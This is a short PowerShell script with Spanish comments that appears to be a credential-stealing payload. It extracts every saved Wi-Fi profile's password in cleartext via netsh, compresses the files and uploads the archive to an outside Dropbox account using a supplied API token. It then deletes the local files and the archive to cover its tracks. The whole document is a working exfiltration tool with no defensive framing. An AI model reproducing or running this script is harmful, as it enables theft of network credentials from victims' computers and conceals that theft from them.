param($AccessToken)
$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
$userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
New-Item -Path $userDir -ItemType Directory

# Recoger contraseñas de WiFi
netsh wlan show profiles | ForEach-Object {
    $profileName = ($_ -split ':')[1].Trim()
    $details = netsh wlan show profile name="$profileName" key=clear
    $details | Out-File -FilePath "$userDir\$profileName.txt"
}

# Comprimir y preparar para subida
Compress-Archive -Path $userDir -DestinationPath "$userDir.zip"
$file = "$userDir.zip"
$dropboxUploadPath = "/Networks_$folderDateTime.zip"

# Headers para API de Dropbox
$headers = @{
    "Authorization" = "Bearer $AccessToken"
    "Content-Type" = "application/octet-stream"
    "Dropbox-API-Arg" = '{"path": "' + $dropboxUploadPath + '","mode": "add","autorename": true}'
}

# Subida a Dropbox
Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -InFile $file

# Limpieza
Remove-Item -Path $userDir -Recurse
Remove-Item -Path $file

